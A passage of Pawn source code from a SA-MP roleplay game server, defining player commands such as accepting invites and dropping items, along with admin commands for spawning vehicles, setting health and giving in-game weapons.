						    return SendClientMessage(playerid, COLOR_GREY, "You can't accept defense while you're cuffed or tazed.");

                        PlayerInfo[playerid][pWantedLevel]--;
                        SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
                        SetPlayerToTeamColor(playerid);
                        giveplayer = GetPlayerNameEx(DefendOffer[playerid]);
                        sendername = GetPlayerNameEx(playerid);
                        format(string, sizeof(string), "* You accepted the Defense for $%d from Lawyer %s.",DefendPrice[playerid],giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s accepted your Defense, and the $%d was added to your money.",sendername,DefendPrice[playerid]);
                        SendClientMessage(DefendOffer[playerid], COLOR_LIGHTBLUE, string);

						#if defined DOUBLE_EXP_ENABLED
							new hour,minuite,second;
							gettime(hour,minuite,second);
							if(DoubleEXPcheck(hour))
							{
				    			PlayerInfo[DefendOffer[playerid]][pLawSkill] += 2;
				    			SendClientMessage(DefendOffer[playerid], COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
							}
							else
							{
								SendClientMessage(DefendOffer[playerid], COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
								PlayerInfo[DefendOffer[playerid]][pLawSkill]++;
							}
						#else
                        	PlayerInfo[DefendOffer[playerid]][pLawSkill]++;
                        #endif

                        GivePlayerCash(DefendOffer[playerid],DefendPrice[playerid]);
                        GivePlayerCash(playerid, -DefendPrice[playerid]);
                        DefendOffer[playerid] = 999;
                        DefendPrice[playerid] = 0;
                        return 1;
                    }
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   You can't afford the Protection!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you any Protection!");
                return 1;
            }
        }
        else if(strcmp(params,"faction",true) == 0) {
            if(InviteOffer[playerid] < 999) {
                if(IsPlayerConnected(InviteOffer[playerid])) {

                    if(GetPVarInt(playerid, "PBM") > 0) {
                        SendClientMessage(playerid, COLOR_WHITE, "You can't do this while playing paintball.");
                        return 1;
                    }

                    if(InviteFaction[playerid] > 0 && InviteFamily[playerid] == 255) {
						PlayerInfo[playerid][pFaction] = InviteFaction[playerid];
                        PlayerInfo[playerid][pRank] = 0;
                        PlayerInfo[playerid][pDivision] = 0;

						format(string, sizeof(string), "%s has accepted %s's invite to join the %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(InviteOffer[playerid]), GetFactionName(InviteFaction[playerid]));
						Log("logs/faction.log", string);
                        format(string, sizeof(string), "   You have accepted the invitation and joined the %s, you were invited by %s.", GetFactionName(InviteFaction[playerid]), GetPlayerNameEx(InviteOffer[playerid]));
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "   %s has accepted the invitation and joined the %s.", GetPlayerNameEx(playerid), GetFactionName(InviteFaction[playerid]));
                        SendClientMessage(InviteOffer[playerid], COLOR_LIGHTBLUE, string);
                        InviteOffer[playerid] = 999;
                        InviteFaction[playerid] = 0;
                        InviteFamily[playerid] = 255;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No one has invited you to join an organisation/family!");
                return 1;
            }
        }
        else if(strcmp(params,"family",true) == 0) {
            if(InviteOffer[playerid] < 999) {
                if(IsPlayerConnected(InviteOffer[playerid])) {
                    if(InviteFaction[playerid] == 0 && InviteFamily[playerid] != 255) {
                        if(GetPVarInt(playerid, "PBM") > 0) {
                            SendClientMessage(playerid, COLOR_WHITE, "You can't do this while playing paintball.");
                            return 1;
                        }

                        if(PlayerInfo[playerid][pJailTime] > 1) {
                            SendClientMessage(playerid, COLOR_WHITE, "Please wait until you're released from jail/prison before you accept the invite.");
                            return 1;
                        }

                        if(PlayerInfo[playerid][pFaction] >= 3 || PlayerInfo[playerid][pGang] != 255 || PlayerInfo[playerid][pLeader] >= 3 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2) {
                            SendClientMessage(playerid, COLOR_WHITE, "You can't accept this invite as you're already in a family/faction.");
                        }
                        else {
                            PlayerInfo[playerid][pGang] = InviteFamily[playerid];
                            PlayerInfo[playerid][pRank] = 1;
                            FamilyInfo[InviteFamily[playerid]][FamilyMembers] ++;
                            SaveFamilies();
                            format(string, sizeof(string), "   You have accepted the invitation and joined the %s, you were invited by %s.", FamilyInfo[InviteFamily[playerid]][FamilyName], GetPlayerNameEx(InviteOffer[playerid]));
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "   %s has accepted the invitation and joined the %s.", GetPlayerNameEx(playerid),FamilyInfo[InviteFamily[playerid]][FamilyName]);
                            SendClientMessage(InviteOffer[playerid], COLOR_LIGHTBLUE, string);
                            SendClientMessage(playerid, COLOR_WHITE, "Use (/f)amily to talk in family chat. If you wish to acquire a family skin, type /clothes inside a clothing store.");

                            InviteOffer[playerid] = 999;
                            InviteFaction[playerid] = 0;
                            InviteFamily[playerid] = 255;
                        }
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No one has invited you to join an organisation/family!");
                return 1;
            }
        }
	}
	return 1;
}

CMD:payday(playerid, params[])
{
	return cmd_paycheck(playerid, params);
}

CMD:paycheck(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
    	foreach(Player, i)
    	{
        	if(WasHereForPaycheck[i] == 1)
        	{
        	    SendClientMessage(playerid,COLOR_WHITE, "The paycheck codes of the last paycheck have not expired yet.");
        	    return 1;
        	}
	    }
		PayDay();
	}
	return 1;
}

CMD:veh(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			iVehicle,
			iColors[2];

		if(sscanf(params, "iI(-1)I(-1)", iVehicle, iColors[0], iColors[1]))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /veh [model ID] [(optional) color 1] [(optional) color 2]");
		}
		else if(!(400 <= iVehicle <= 611))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Invalid model specified (model IDs start at 400, and end at 611).");
		}
  		else if(iColors[0] < -1 || iColors[0] > 255 || iColors[1] < -1 || iColors[1] > 255) {
			SendClientMessage(playerid, COLOR_GRAD2, "Invalid colour specified (IDs start at -1, and end at 255).");
		}
		else if(CreatedCarsCount >= 50)
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Only a maximum of 50 cars can be admin spawned at a time. Use /destroycar or /destroycars");
		    return 1;
		}
		else for(new iIterator; iIterator < sizeof(CreatedCars); iIterator++) if(CreatedCars[iIterator] == INVALID_VEHICLE_ID)
		{
			new
				Float: fVehPos[4];

			GetPlayerPos(playerid, fVehPos[0], fVehPos[1], fVehPos[2]);
			GetPlayerFacingAngle(playerid, fVehPos[3]);
			CreatedCars[iIterator] = CreateVehicle(iVehicle, fVehPos[0], fVehPos[1], fVehPos[2], fVehPos[3], iColors[0], iColors[1], -1);
			CreatedCarsCount++;
			LinkVehicleToInterior(CreatedCars[iIterator], GetPlayerInterior(playerid));
			return SendClientMessage(playerid, COLOR_GREY, "Vehicle spawned!");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:vehname(playerid, params[])
{

	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		SendClientMessage(playerid, COLOR_NEWS,"___________________________________________________________________________________________________");
		SendClientMessage(playerid, COLOR_WHITE, "Vehicle Search:");

		new
			string[128];

		if(isnull(params)) return SendClientMessage(playerid, COLOR_GREY, "No keyword specified.");
		if(!params[2]) return SendClientMessage(playerid, COLOR_GREY, "Search keyword too short.");

		for(new v; v < sizeof(VehicleName); v++) {
			if(strfind(VehicleName[v], params, true) != -1) {

				if(isnull(string)) format(string, sizeof(string), "%s (ID %d)", VehicleName[v], v+400);
				else format(string, sizeof(string), "%s | %s (ID %d)", string, VehicleName[v], v+400);
			}
		}

		if(!string[0]) SendClientMessage(playerid, COLOR_GREY, "No results found.");
		else if(string[127]) SendClientMessage(playerid, COLOR_GREY, "Too many results found.");
		else SendClientMessage(playerid, COLOR_WHITE, string);

		SendClientMessage(playerid, COLOR_NEWS,"___________________________________________________________________________________________________");
	}
	return 1;
}

CMD:fixveh(playerid, params[])
{
    if(IsPlayerConnected(playerid))
	{
        if(PlayerInfo[playerid][pAdmin] < 4)
		{
            SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
            return 1;
        }
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        if(IsPlayerInAnyVehicle(playerid))
		{
            RepairVehicle(GetPlayerVehicleID(playerid));
            SendClientMessage(playerid, COLOR_GREY, "Vehicle Fixed!");
        }
    }
    return 1;
}


CMD:fixvehall(playerid, params[])
{
    if(IsPlayerConnected(playerid)) {
        if(PlayerInfo[playerid][pAdmin] < 5)
		{
            SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
            return 1;
        }
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        for(new v = 0; v < MAX_VEHICLES; v++) {
            RepairVehicle(v);
        }
        SendClientMessage(playerid, COLOR_GREY, "All vehicles fixed!");
    }
    return 1;
}

CMD:destroycars(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 4)
	{
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}
    for(new i = 0; i < sizeof(CreatedCars); i++)
	{
        if(CreatedCars[i] != INVALID_VEHICLE_ID)
		{
            DestroyVehicle(CreatedCars[i]);
            VehicleRadioStation[CreatedCars[i]] = 0;
            CreatedCarsCount = 0;
            CreatedCars[i] = INVALID_VEHICLE_ID;
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "Created vehicles destroyed!");
    return 1;
}

CMD:destroycar(playerid, params[])
{
	new string[128];

	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
 	}
	new bool:breakingloop = false, newid = INVALID_VEHICLE_ID;
	if(IsPlayerInAnyVehicle(playerid))
	{
		for(new i=0;i<sizeof(CreatedCars);i++)
		{
			if(!breakingloop)
			{
				if(CreatedCars[i] == GetPlayerVehicleID(playerid)) // Checking for next available ID.
				{
					breakingloop = true;
					newid = i;
				}
			}
		}
		if(newid != INVALID_VEHICLE_ID)
		{
			new carid = GetPlayerVehicleID(playerid);
			DestroyVehicle(carid);
            VehicleRadioStation[carid] = 0;
			CreatedCarsCount--;
			CreatedCars[newid] = INVALID_VEHICLE_ID;
			format(string, sizeof(string), "Car %d destroyed.", carid);
			SendClientMessage(playerid, COLOR_GREY, string);
		}
	}
	return 1;
}

CMD:healnear(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        new string[128];
        new count;
        foreach(Player, i) {
            if(ProxDetectorS(12.0, playerid, i)) {
                SetPlayerHealth(i, 100);
                SetPlayerArmourEx(i, 100);
                count++;
            }
        }
        format(string, sizeof(string), "You have healed everyone (%d) nearby.", count);
        SendClientMessage(playerid, COLOR_WHITE, string);
    }
    return 1;
}

CMD:sethp(playerid, params[])
{
    new string[128], playa, health;
    if(sscanf(params, "ud", playa, health))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sethp [playerid/partofname] [health]");
        return 1;
    }
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        if(IsPlayerConnected(playa)) {
            if(playa != INVALID_PLAYER_ID)
			{
                SetPlayerHealth(playa, health);
                format(string, sizeof(string), "You have set %s's health to %d.", GetPlayerNameEx(playa), health);
                SendClientMessage(playerid, COLOR_WHITE, string);
            }
        }
        else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:setarmor(playerid, params[])
{
    new string[128], playa, health;
    if(sscanf(params, "ud", playa, health))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setarmor [playerid/partofname] [armor]");
        return 1;
    }
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        if(IsPlayerConnected(playa))
		{
            if(playa != INVALID_PLAYER_ID)
			{
                SetPlayerArmourEx(playa, health);
                format(string, sizeof(string), "You have set %s's armor to %d.", GetPlayerNameEx(playa), health);
                SendClientMessage(playerid, COLOR_WHITE, string);
            }
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:setarmorall(playerid, params[])
{
    new armor;
    if(sscanf(params, "d", armor)) {
        SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setarmorall [armor]");
        return 1;
    }

    if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        foreach(Player, i)
		{
            SetPlayerArmourEx(i, armor);
        }
    }

    else {
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:givegun(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

        new sstring[128], playa, gun;

        if(sscanf(params, "ud", playa, gun)) {
            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /givegun [playerid/partofname] [weaponid]");
            SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
            SendClientMessage(playerid, COLOR_GRAD4, "1: Brass Knuckles 2: Golf Club 3: Nite Stick 4: Knife 5: Baseball Bat 6: Shovel 7: Pool Cue 8: Katana 9: Chainsaw");
            SendClientMessage(playerid, COLOR_GRAD4, "10: Purple Dildo 11: Small White Vibrator 12: Large White Vibrator 13: Silver Vibrator 14: Flowers 15: Cane 16: Frag Grenade");
            SendClientMessage(playerid, COLOR_GRAD3, "17: Tear Gas 18: Molotov Cocktail 19: Vehicle Missile 20: Hydra Flare 21: Jetpack 22: 9mm 23: Silenced 9mm 24: Desert Eagle");
            SendClientMessage(playerid, COLOR_GRAD4, "26: Sawnoff Shotgun 27: Combat Shotgun 28: Micro SMG (Mac 10) 29: SMG (MP5) 30: AK-47 31: M4 32: Tec9 33: Rifle");
            SendClientMessage(playerid, COLOR_GRAD4, "25: Shotgun 34: Sniper Rifle 35: Rocket Launcher 36: HS Rocket Launcher 37: Flamethrower 38: Minigun 39: Satchel Charge");
            SendClientMessage(playerid, COLOR_GRAD4, "40: Detonator 41: Spraycan 42: Fire Extinguisher 43: Camera 44: Nightvision Goggles 45: Infared Goggles 46: Parachute");
            SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
            return 1;
        }

        if(gun < 1||gun > 47)
            { SendClientMessage(playerid, COLOR_GRAD1, "Invalid weapon ID!"); return 1; }
        if(IsPlayerConnected(playa)) {
            if(PlayerInfo[playa][pConnectTime] < 2 && gun != 46 && gun != 43) return SendClientMessage(playerid, COLOR_GRAD2, "That player is currently restricted from carrying weapons");
            if(playa != INVALID_PLAYER_ID && gun <= 20 || gun >= 22) {

                GivePlayerValidAdminWeapon(playa, gun, 60000);

                new weaponname[32];
                GetWeaponName(gun, weaponname, sizeof(weaponname));

                format(sstring, sizeof(sstring), "You have given %s gun ID %d (%s)!",GetPlayerNameEx(playa), gun, weaponname);
                SendClientMessage(playerid, COLOR_GRAD1, sstring);
            }
            else if(playa != INVALID_PLAYER_ID && gun == 21) {
                JetPack[playa] = 1;
                SetPlayerSpecialAction(playa, SPECIAL_ACTION_USEJETPACK);
                SendClientMessage(playerid, COLOR_GRAD1, sstring);
            }
        }
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:signcheck(playerid, params[])
{
	if(PayCheckCode[playerid] == 0) return SendClientMessage(playerid, COLOR_WHITE, "There is no paycheck to sign. Please wait for the next paycheck.");

 	new string[128];
	format(string, sizeof(string), "Check code: %d\n\nEnter your check code to receive your paycheck:", PayCheckCode[playerid]);
	ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Sign check", string, "Sign check","Cancel");
    return 1;
}

CMD:drop(playerid, params[]) {
	new string[128], choice[32];
	if(sscanf(params, "s[32]", choice))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /drop [name]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Weapons, Pot, Crack, Materials, Packages, Crates, Radio, Pizza, Licenses, Housekey");
		return 1;
	}

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't use this command while you're cuffed/tazed.");

	if(strcmp(choice,"materials",true) == 0)
	{
		if(PlayerInfo[playerid][pMats] > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "You have dropped %d materials.", PlayerInfo[playerid][pMats]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "* %s has thrown away their materials.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pMats] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not carrying any materials to throw away!");
		}
	}
	else if(strcmp(choice,"housekey",true) == 0)
	{
		if(HouseKey[playerid] != INVALID_HOUSE_ID)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "You have dropped %s's house keys.", HouseInfo[HouseKey[playerid]][hOwner]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "* %s has thrown away a house key.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			HouseKey[playerid] = INVALID_HOUSE_ID;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You don't have anyone's house key.");
		}
	}
	else if(strcmp(choice,"radio",true) == 0)
	{
		if(PlayerInfo[playerid][pRadio] != 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s has thrown away their portable radio.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pRadio] = 0;
			PlayerInfo[playerid][pRadioFreq] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not carrying a portable radio to throw away!");
		}
	}
	else if(strcmp(choice,"licenses",true) == 0)
	{
		PlayerInfo[playerid][pCarLic] = 0;
		PlayerInfo[playerid][pBoatLic] = 0;
		PlayerInfo[playerid][pFlyLic] = 0;

		SendClientMessage(playerid, COLOR_WHITE, "You have dropped all of your licenses.");
	}
	else if(strcmp(choice,"weapons",true) == 0)
	{
		if(GetPVarInt(playerid, "PBM") > 0)
		{
			SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");
			return 1;
		}
		if(GetPVarInt(playerid, "EventToken") != 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");
			return 1;
		}
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		ResetPlayerWeaponsEx(playerid);
		format(string, sizeof(string), "* %s has thrown away their Weapons.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	else if(strcmp(choice,"pot",true) == 0)
	{
		if(PlayerInfo[playerid][pPot] > 0)
		{
			format(string, sizeof(string), "You have dropped %d grams of pot.", PlayerInfo[playerid][pPot]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s has thrown away their pot.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pPot] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not carrying any pot to throw away!");
		}
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		if(PlayerInfo[playerid][pCrack] > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "You have dropped %d grams of crack.", PlayerInfo[playerid][pCrack]);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "* %s has thrown away their crack.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pCrack] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not carrying any crack to throw away!");
		}
	}
	else if(strcmp(choice,"packages",true) == 0) {
		if(GetPVarType(playerid, "Packages") > 0) {
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s has thrown away their material packages.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			DisablePlayerCheckpoint(playerid);
			gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;

			GivePlayerCash(playerid, 50); // refund their packages
			DeletePVar(playerid, "tpMatRunTimer");
			DeletePVar(playerid, "Packages");
			DeletePVar(playerid, "MatDelivery");
		}
		else SendClientMessage(playerid, COLOR_GREY, "You're not carrying any material packages to throw away!");
	}
	else if(strcmp(choice,"crates",true) == 0)
	{
		if(PlayerInfo[playerid][pCrates] > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s has thrown away their drug crates.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pCrates] = 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not carrying any drug crates to throw away!");
		}
	}
	else if(strcmp(choice,"pizza",true) == 0)
	{
		if(GetPVarInt(playerid, "Pizza") > 0)
		{
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string, sizeof(string), "* %s has thrown away their pizza delivery.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SetPVarInt(playerid, "Pizza", 0);
            DestroyProgressBar(PizzaBar[playerid]);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not delivering any pizzas!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /drop [name]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Weapons, Pot, Crack, Materials, Packages, Crates, Radio, Pizza, Licenses, Housekey");
	}
	return 1;
}

CMD:setfightstyle(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], giveplayerid, fightstyle;
		if(sscanf(params, "ud", giveplayerid, fightstyle))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setfightstyle [playerid/partofname] [fightstyle]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available fighting styles: 4, 5, 6, 7, 15, 26.");
			return 1;
		}

		if(fightstyle > 3 && fightstyle < 8 || fightstyle == 15 || fightstyle == 26)
		{
			format(string, sizeof(string), " Your fighting style has been changed to %d.", fightstyle);
			SendClientMessage(giveplayerid,COLOR_YELLOW,string);
			format(string, sizeof(string), " You have changed %s's fighting style to %d.", GetPlayerNameEx(giveplayerid), fightstyle);
			SendClientMessage(playerid,COLOR_YELLOW,string);
			SetPlayerFightingStyle(giveplayerid, fightstyle);
			PlayerInfo[playerid][pFightStyle] = fightstyle;
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:hospital(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		if(GetPVarInt(playerid, "Hospital") > 0)
		{
			DeletePVar(playerid, "HospitalTimer");
			HospitalSpawn(playerid);
			DeletePVar(playerid, "Hospital");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You're not in the hospital!");
		}
	}
	return 1;
}

CMD:payhelp(playerid, params[])
{
	ShowPlayerDialogEx(playerid,INFO_DIALOG,DIALOG_STYLE_MSGBOX,"Paycheck information","Paychecks come in every hour and require you to sign them with /signcheck.\n\nThe longer you play in the hour, the bigger your paycheck.\n\nThe higher your level, the bigger your paycheck.\n\nPaychecks go directly to your bank account rather than your on-hand cash.\n\nIf you miss a paycheck, then the missed amount will be added to your next paycheck.","Close","");
	return 1;
}


CMD:taxhelp(playerid, params[])
{
	ShowPlayerDialogEx(playerid,INFO_DIALOG,DIALOG_STYLE_MSGBOX,"Income tax information","Paychecks have a progressive income tax as opposed to a flat tax.\n\nThis basically means that the higher your paycheck is, the higher the percentage of income tax.\n\nThe percentages are as following:\n\nAnything below $1250 - 10% taxation\n$1250 to $1999 - 15% taxation\n$2000 to $2499 - 25% taxation\n$2500 to $3499 - 30% taxation\nAnything above $3500 - 35% taxation","Close","");
	return 1;
}

CMD:refhelp(playerid, params[])
{
	ShowPlayerDialogEx(playerid,12768,DIALOG_STYLE_MSGBOX,"Referral system information", "The referral system allows players to refer their friends to the server and receive a reward for doing so.\n\nIn the registration screen the new player can enter a player's name if they were referred by a friend.\n\nIf the new player reaches 8 playing hours then the person who referred them will receive 1 referral token.","Next","");
	return 1;
}



CMD:destroycheckpoint(playerid, params[]) {
	return cmd_killcheckpoint(playerid, params);
}
CMD:kcp(playerid,paramsp[])
{
	TaxiAccepted[playerid] = 999;
	BusAccepted[playerid] = 999;
	MedicAccepted[playerid] = 999;
	MechanicCallTime[playerid] = 0;
    DeletePVar(playerid, "TrackCar");
    DeletePVar(playerid, "CrateDeliver");
    DeletePVar(playerid, "Packages");
    EMSAccepted[playerid] = INVALID_PLAYER_ID;
    DisablePlayerCheckpoint(playerid);
	gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 	TaxiCallTime[playerid] = 0;
  	BusCallTime[playerid] = 0;
  	EMSCallTime[playerid] = 0;
  	DeletePVar(playerid, "Pizza");
